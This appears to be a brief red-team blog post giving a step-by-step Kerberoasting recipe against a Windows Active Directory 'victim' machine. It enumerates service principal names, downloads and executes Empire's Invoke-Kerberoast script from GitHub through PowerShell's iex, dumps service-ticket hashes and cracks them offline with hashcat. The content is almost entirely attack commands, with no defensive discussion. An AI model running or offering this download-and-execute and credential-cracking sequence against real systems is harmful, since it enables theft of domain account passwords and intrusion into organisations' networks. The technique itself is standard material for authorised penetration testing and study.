---
layout: post
title: Kerberoasting using Powershell
description: Kerberoasting using Powershell
summary: Kerberoasting using Powershell
tags: [foothold,windows,ad,kerberos]
minute: 1
---
## Overview
This will request a service ticket for an account and acquire a hash using powershell.

## Requirement
* You have access to the victim’s windows machine
* Powershell is installed

## Steps
* Extract SPNs (mapping between service and account)

```powershell
setspn -T medin -Q */*
```

* Get powershell script

```powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
```

* Run script and copy hash to attacker’s machine

```powershell
Invoke-Kerberoast -OutputFormat hashcat |fl
```

* Sample output

![](/spindel/assets/Kerberoasting%20using%20Powershell/X2lGkzF.png)

* Crack hash using hashcat (mode kerberos 5 TGS-REP etype 23)

```bash
hashcat -m 13100 - a 0 hash.txt wordlist --force
```

## Alternative
* [Kerberoasting - Red Teaming Experiments](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)